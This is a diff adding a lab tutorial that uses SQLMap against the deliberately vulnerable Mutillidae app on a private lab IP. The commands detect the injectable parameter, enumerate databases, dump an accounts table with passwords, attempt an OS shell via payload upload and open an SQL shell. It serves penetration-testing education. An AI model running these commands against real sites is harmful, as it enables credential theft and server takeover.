@@ -1990,4 +1990,328 @@ Once the file was accessed through the vulnerable page, a connection was receive
  Local File Inclusion can allow access to files stored outside the web root.
 
 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+
+ Automating SQL Injection with SQLMap
+
+So far, we have manually exploited SQL Injection vulnerabilities by injecting SQL queries into URL parameters and input fields. While this helps us understand how SQL Injection works, manually extracting data can become slow and repetitive.
+
+In this exercise, we use **SQLMap**, an open-source penetration testing tool that automates SQL Injection detection and exploitation. SQLMap supports many database management systems, including:
+
+* MySQL
+* Microsoft SQL Server
+* PostgreSQL
+* Oracle
+* SQLite
+* and many others.
+
+Instead of manually writing SQL Injection payloads, SQLMap automatically detects vulnerable parameters and extracts information from the database.
+
+---
+
+ Step 1 – Copy the Vulnerable URL
+
+We use the same vulnerable page that we exploited manually earlier.
+
+```text
+http://172.16.219.181/mutillidae/index.php?page=user-info.php&username=admin&password=test&user-info-php-submit-button=View+Account+Details
+```
+
+Notice that the username and password do **not** need to be valid because SQLMap is testing the SQL Injection vulnerability rather than performing a legitimate login.
+
+---
+
+ Step 2 – Scan the Target
+
+Run SQLMap against the URL.
+
+```bash
+sqlmap -u "http://172.16.219.181/mutillidae/index.php?page=user-info.php&username=admin&password=test&user-info-php-submit-button=View+Account+Details"
+```
+
+The quotation marks are important because the URL contains special characters such as `&`. Without quotation marks, the terminal would treat each parameter separately.
+
+SQLMap automatically:
+
+* Tests every parameter in the URL.
+* Checks whether the parameters are vulnerable to SQL Injection.
+* Attempts to identify the backend database.
+* Stores the discovered information for future commands.
+
+
+
+---
+
+ Step 3 – Detect the Vulnerability
+
+During the scan, SQLMap determines that the backend database is MySQL.
+
+It may ask several questions such as:
+
+```text
+It looks like the back-end DBMS is MySQL.
+Do you want to skip tests for other databases? [Y/n]
+```
+
+Since we know the application uses MySQL, we answer:
+
+```text
+Y
+```
+
+SQLMap continues testing until it identifies the vulnerable parameter.
+
+Eventually, it reports:
+
+```text
+Parameter: username
+Type: SQL Injection
+```
+
+At this point SQLMap has confirmed that the **username** parameter is vulnerable.
+
+
+
+---
+
+ Step 4 – Gather Server Information
+
+Once SQLMap confirms the vulnerability, it also gathers information about the target server.
+
+For example, it identifies:
+
+* Operating System: Linux Ubuntu
+* Web Server: Apache 2.2.8
+* Programming Language: PHP
+* Database Server: MySQL
+
+
+
+---
+
+ Step 5 – Display SQLMap Help
+
+SQLMap contains hundreds of features.
+
+To view all available options:
+
+```bash
+sqlmap --help
+```
+
+For this exercise, we focus on the most commonly used features for database enumeration.
+
+---
+
+ Step 6 – Enumerate Databases
+
+To list every database available on the server:
+
+```bash
+sqlmap -u "TARGET_URL" --dbs
+```
+
+SQLMap returns databases similar to:
+
+```text
+dvwa
+information_schema
+metasploit
+mysql
+owasp10
+tikiwiki
+```
+
+
+
+---
+
+ Step 7 – Find the Current Database User
+
+To determine which database account the web application is using:
+
+```bash
+sqlmap -u "TARGET_URL" --current-user
+```
+
+Example output:
+
+```text
+root@localhost
+```
+
+
+
+---
+
+ Step 8 – Find the Current Database
+
+To determine which database the web application is connected to:
+
+```bash
+sqlmap -u "TARGET_URL" --current-db
+```
+
+Example output:
+
+```text
+owasp10
+```
+
+
+
+---
+
+ Step 9 – Enumerate Tables
+
+Next, retrieve all tables inside the **owasp10** database.
+
+```bash
+sqlmap -u "TARGET_URL" -D owasp10 --tables
+```
+
+SQLMap returns:
+
+* accounts
+* blogs_table
+* credit_cards
+* hitlog
+* pentest_tools
+
+These are the same tables that we previously discovered manually using `information_schema.tables`.
+
+
+
+---
+
+ Step 10 – Enumerate Columns
+
+Now retrieve the columns inside the **accounts** table.
+
+```bash
+sqlmap -u "TARGET_URL" -D owasp10 -T accounts --columns
+```
+
+Example output:
+
+* username
+* password
+* isadmin
+* mysignature
+
+
+
+---
+
+ Step 11 – Dump the Table Contents
+
+To extract all records from the accounts table:
+
+```bash
+sqlmap -u "TARGET_URL" -D owasp10 -T accounts --dump
+```
+
+SQLMap automatically retrieves every row.
+
+Example output:
+
+```text
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | admin    | adminpass  |
+| 2  | adrian   | somepass   |
+| 3  | jeremy   | password   |
++----+----------+------------+
+```
+
+This is the same information we extracted manually using **UNION SELECT**, but SQLMap performs the entire process automatically.
+
+
+
+---
+
+ Step 12 – Attempt to Obtain an Operating System Shell
+
+SQLMap can also attempt to upload a payload to obtain an operating system shell.
+
+Run:
+
+```bash
+sqlmap -u "TARGET_URL" --os-shell
+```
+
+SQLMap detects that the target uses PHP and attempts to upload a PHP payload.
+
+
+
+In this lab, the upload fails because the MySQL user does not have permission to write files to the web directory.
+
+Example output:
+
+```text
+404 Not Found
+Unable to upload file
+```
+
+If the upload were successful, SQLMap would provide an interactive operating system shell, allowing commands to be executed directly on the target server.
+
+
+
+---
+
+ Step 13 – Open an Interactive SQL Shell
+
+Instead of manually writing SQL Injection payloads, SQLMap can provide an interactive SQL shell.
+
+Run:
+
+```bash
+sqlmap -u "TARGET_URL" --sql-shell
+```
+
+
+
+Now SQL statements can be executed directly.
+
+For example, display the current user:
+
+```sql
+SELECT USER();
+```
+
+Display the current database:
+
+```sql
+SELECT DATABASE();
+```
+
+Retrieve all tables:
+
+```sql
+SELECT table_name
+FROM information_schema.tables
+WHERE table_schema='owasp10';
+```
+
+SQLMap executes the SQL query directly and returns the results.
+
+
+
+The SQL shell is often easier to use than manually creating `UNION SELECT` payloads because you can execute standard SQL statements exactly as you would in a MySQL console.
+
+---
+
+ Key Takeaways
+
+* SQLMap automates SQL Injection detection and exploitation.
+* It automatically identifies vulnerable parameters.
+* It detects the backend database management system.
+* It can enumerate databases, tables, columns, and records.
+* The `--dump` option automatically extracts table contents.
+* The `--os-shell` option attempts to obtain an operating system shell if the database user has sufficient file write permissions.
+* The `--sql-shell` option provides an interactive SQL console for executing SQL queries directly.
+* SQLMap performs the same tasks that we previously carried out manually, but much faster and with far less effort.
 
